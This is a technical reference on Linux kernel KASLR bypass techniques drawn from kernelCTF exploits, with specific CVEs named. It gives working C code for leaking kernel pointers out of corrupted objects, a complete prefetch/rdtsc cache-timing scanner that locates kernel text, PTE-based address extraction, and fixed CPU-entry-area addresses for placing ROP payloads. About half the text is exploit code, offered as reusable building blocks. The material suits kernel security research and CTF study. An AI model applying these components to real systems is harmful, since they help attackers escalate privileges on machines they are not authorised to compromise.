# KASLR Bypass Techniques

Detailed implementations of all KASLR bypass methods found across 96 kernelCTF exploits.

## Method 1: Kernel Pointer Leak via Object Corruption

**Used in**: ~70% of exploits (CVE-2023-3390, CVE-2023-5197, CVE-2024-0193, CVE-2024-26925, etc.)

### Principle
Corrupted/freed kernel objects often contain pointers to kernel symbols (function pointers in ops structures, list heads, etc.). Reading these pointers reveals the kernel base address.

### Common Leaked Pointers

| Pointer | Found In | Offset From | Used By |
|---------|----------|-------------|---------|
| `nft_counter_ops` | nft_expr->ops | .rodata | nftables CVEs |
| `nft_ct_expect_obj_ops` | nft_obj->ops | .rodata | nftables CVEs |
| `tbf_qdisc_ops` | Qdisc->ops | .data | net/sched CVEs |
| `packet_rcv_fanout` | packet_fanout->ops | .text | AF_PACKET CVEs |
| `shmem_file_operations` | file->f_op | .rodata | io_uring CVEs |
| `anon_pipe_buf_ops` | pipe_buffer->ops | .rodata | pipe CVEs |

### Implementation Pattern
```c
/* After reclaiming freed object with controlled data, read back */
char leak_buf[TARGET_SIZE];
leak_read(leak_buf, TARGET_SIZE);  // msgrcv, keyctl_read, etc.

/* Extract pointer at known offset */
unsigned long leaked_ptr = *(unsigned long *)(leak_buf + OPS_OFFSET);

/* Validate it looks like a kernel pointer */
if ((leaked_ptr & 0xffff000000000000) != 0xffff000000000000) {
    printf("[-] Bad leak: 0x%lx\n", leaked_ptr);
    return -1;
}

/* Calculate kernel base */
unsigned long kbase = leaked_ptr - SYMBOL_OFFSET_FROM_BASE;
printf("[+] Kernel base: 0x%lx\n", kbase);
```

### Finding Symbol Offsets
```bash
# From vmlinux (if available):
nm vmlinux | grep nft_counter_ops
readelf -s vmlinux | grep nft_counter_ops

# From /proc/kallsyms (requires root or kptr_restrict=0):
cat /proc/kallsyms | grep nft_counter_ops

# Offset = symbol_address - kernel_base (typically 0xffffffff81000000 for non-KASLR)
```

---

## Method 2: Cache Timing Side-Channel (Prefetch + rdtsc)

**Used in**: CVE-2023-5197, CVE-2023-31436, CVE-2024-27397, CVE-2023-5345

### Principle
The prefetch instruction behaves differently on mapped vs unmapped virtual addresses. By measuring timing with rdtsc, we can determine which 2MB-aligned addresses are mapped to kernel text.

### Implementation
```c
#include <x86intrin.h>

#define KERNEL_TEXT_START  0xffffffff80000000UL
#define KERNEL_TEXT_END    0xffffffffc0000000UL
#define STEP_SIZE          0x200000UL  /* 2MB alignment (huge page) */
#define NUM_TRIALS         200
#define TIMING_THRESHOLD   100  /* Adjust per system */

static inline unsigned long measure_prefetch(unsigned long addr) {
    unsigned long t1, t2;

    _mm_mfence();
    t1 = __rdtsc();
    _mm_mfence();

    /* Prefetch the address */
    __asm__ volatile(
        "prefetchnta (%0)\n"
        :
        : "r"(addr)
        : "memory"
    );

    _mm_mfence();
    t2 = __rdtsc();
    _mm_mfence();

    return t2 - t1;
}

/* Alternative: flush+reload variant */
static inline unsigned long flushandreload(unsigned long addr) {
    unsigned long t1, t2;

    __asm__ volatile(
        "mfence\n"
        "rdtsc\n"
        "shl $32, %%rdx\n"
        "or %%rdx, %%rax\n"
        "mov %%rax, %0\n"
        "mfence\n"
        "prefetchnta (%2)\n"
        "mfence\n"
        "rdtsc\n"
        "shl $32, %%rdx\n"
        "or %%rdx, %%rax\n"
        "mov %%rax, %1\n"
        "mfence\n"
        : "=r"(t1), "=r"(t2)
        : "r"(addr)
        : "rax", "rdx", "memory"
    );

    return t2 - t1;
}

unsigned long kaslr_bypass_timing(void) {
    unsigned long best_addr = 0;
    int best_count = 0;

    for (unsigned long addr = KERNEL_TEXT_START;
         addr < KERNEL_TEXT_END;
         addr += STEP_SIZE) {

        int hit_count = 0;

        for (int trial = 0; trial < NUM_TRIALS; trial++) {
            unsigned long timing = measure_prefetch(addr);
            if (timing < TIMING_THRESHOLD) {
                hit_count++;
            }
        }

        /* Mapped pages respond faster (more cache hits) */
        if (hit_count > best_count) {
            best_count = hit_count;
            best_addr = addr;
        }
    }

    if (best_count < NUM_TRIALS / 3) {
        printf("[-] KASLR bypass failed (best: %d/%d hits)\n",
               best_count, NUM_TRIALS);
        return 0;
    }

    /* Kernel base is typically at the first mapped 2MB page */
    printf("[+] Kernel text detected at: 0x%lx (%d/%d hits)\n",
           best_addr, best_count, NUM_TRIALS);

    /* Adjust for startup_64 offset if needed */
    unsigned long kbase = best_addr;  /* May need alignment correction */
    return kbase;
}
```

### Reliability Notes
- Works best on bare metal and KVM
- Container environments may have noise
- Run multiple rounds and take majority vote
- Pin to single CPU to reduce timing noise
- Some kernels have prefetch mitigations

---

## Method 3: BPF JIT Pack Allocator Analysis

**Used in**: CVE-2025-21700

### Principle
BPF JIT uses a pack allocator that places JIT code at predictable offsets within module memory. By observing allocation patterns, the module region base can be inferred.

### Key Observations
- BPF JIT programs are allocated in the module region
- Pack allocator groups allocations into pages
- Page-aligned properties leak allocation base
- Jump offset between BPF programs reveals relative layout

---

## Method 4: PTE Value Extraction

**Used in**: CVE-2023-5717, CVE-2023-6560, CVE-2025-37756

### Principle
If you can read a Page Table Entry (PTE), the physical address encoded in it can reveal the kernel's memory layout. The `empty_zero_page` is at a known physical offset.

### Implementation
```c
/* If you have arbitrary read at PTE level:
 *
 * PTE format (x86-64):
 *   Bits 12-51: Physical page frame number
 *   Bit 0: Present
 *   Bit 1: Read/Write
 *   Bit 2: User/Supervisor
 *   ...
 *
 * 1. Read PTE for a known kernel address
 * 2. Extract physical address: phys = (pte >> 12) << 12
 * 3. From physical address, calculate virtual base:
 *    kbase = phys_to_virt(phys - known_offset)
 */

#define PTE_PFN_MASK  0x000ffffffffff000UL

unsigned long pte_to_phys(unsigned long pte) {
    return pte & PTE_PFN_MASK;
}
```

---

## Method 5: CPU Entry Area (Deterministic Address)

**Used in**: CVE-2023-3390, CVE-2024-27397

### Principle
CPU entry area is mapped at fixed virtual addresses (not randomized by KASLR). It can be used as a target for writing payloads.

```c
/* CPU entry area base: 0xfffffe0000000000
 * Per-CPU entry area: base + cpu * 0x3b000
 * Exception stack: per_cpu_area + 0x1f58
 *
 * This is NOT a KASLR bypass itself, but a useful target for writing
 * ROP payloads when you have an arbitrary write but need a known address.
 */
#define CPU_ENTRY_AREA_BASE  0xfffffe0000000000UL
#define PER_CPU_ENTRY_SIZE   0x3b000UL
#define EXCEPTION_STACK_OFF  0x1f58UL

unsigned long get_cpu_entry_area(int cpu) {
    return CPU_ENTRY_AREA_BASE + cpu * PER_CPU_ENTRY_SIZE + EXCEPTION_STACK_OFF;
}
```
